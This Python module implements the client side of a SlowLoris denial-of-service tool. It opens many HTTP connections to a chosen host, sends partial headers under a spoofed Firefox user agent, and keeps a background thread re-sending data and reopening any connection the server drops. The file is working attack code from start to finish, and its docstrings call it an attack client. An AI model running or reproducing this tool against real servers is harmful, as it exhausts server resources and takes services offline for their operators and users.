"""This module implements the SlowLoris client."""

import threading
import time

from .connection import LorisConnection

# Constants
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"

class SlowLoris:
    """SlowLoris attack client."""

    def __init__(self):
        self.connections = []
        self.recreated_connections = 0
        self.connections_dropped = False
        self.keepalive_thread = threading.Thread(target=self.keep_alive)
        self.keepalive_thread.setDaemon(True)
        self.keepalive_thread.start()

    def attack(self, host, port, count):
        """Starts the attack."""
        print("Initializing up to {} connections.".format(count))
        # Start 'count' connections and send the initial HTTP headers.
        for i in range(count):
            if i == count // 10 and not self.connections_dropped:
                print("Be patient, this could take some time.")
            conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
            self.connections.insert(0, conn)

    def stop(self):
        """Stops the attack."""
        for conn in self.connections:
            conn.close()

    def keep_alive(self):
        """Make sure that connections stay alive once established."""
        while True:
            time.sleep(5)
            connection_count = len(self.connections)
            # print("Sending keep-alive headers for {} connections.".format(connection_count))
            # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
            for i in range(0, connection_count):
                try:
                    self.connections[i].keep_alive()
                except KeyboardInterrupt:
                    raise
                # pylint: disable=W0702
                # If the server closed one of our connections,
                # re-open the connection in its place.
                except:
                    if not self.connections_dropped:
                        self.connections_dropped = True
                        print("Host started dropping connections.")
                    threshold = 5
                    if self.recreated_connections >= threshold:
                        print("Reconnected {} dropped connections."
                              .format(self.recreated_connections))
                        self.recreated_connections -= threshold
                    host, port = (self.connections[i].host, self.connections[i].port)
                    conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
                    if conn.is_connected:
                        self.connections[i] = conn
                        self.recreated_connections += 1
